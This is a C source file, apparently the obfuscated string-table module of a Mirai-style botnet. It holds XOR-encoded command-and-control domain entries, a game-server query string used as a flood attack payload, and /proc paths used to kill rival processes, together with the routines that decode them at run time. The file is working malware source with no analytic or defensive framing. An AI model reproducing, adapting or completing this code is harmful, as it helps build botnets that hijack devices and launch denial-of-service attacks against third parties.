#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0x8f39449;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void) {
    add_entry(TABLE_CNC_DOMAIN1, "\x51\x53\x45\x4E\x5E\x4E\x47\x48\x41\x45\x4E\x4F\x48\x47\x08\x42\x5F\x48\x26", 19);
    add_entry(TABLE_CNC_DOMAIN2, "\x51\x53\x45\x4E\x5E\x4E\x47\x48\x41\x45\x4E\x4F\x48\x47\x08\x42\x5F\x48\x26", 19);
    add_entry(TABLE_CNC_DOMAIN3, "\x51\x53\x45\x4E\x5E\x4E\x47\x48\x41\x45\x4E\x4F\x48\x47\x08\x42\x5F\x48\x26", 19);
    add_entry(TABLE_CNC_DOMAIN4, "\x51\x53\x45\x4E\x5E\x4E\x47\x48\x41\x45\x4E\x4F\x48\x47\x08\x42\x5F\x48\x26", 19);
    add_entry(TABLE_ATK_VSE, "\x72\x75\x49\x53\x54\x45\x43\x06\x63\x48\x41\x4F\x48\x43\x06\x77\x53\x43\x54\x5F\x26", 21);
    add_entry(TABLE_KILLER_FD, "\x09\x40\x42\x26", 4);
    add_entry(TABLE_KILLER_EXE, "\x09\x43\x5E\x43\x26", 5);
    add_entry(TABLE_KILLER_CMDLINE, "\x09\x45\x4B\x42\x4A\x4F\x48\x43\x26", 9);
    add_entry(TABLE_KILLER_PROC, "\x09\x56\x54\x49\x45\x09\x26", 7);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
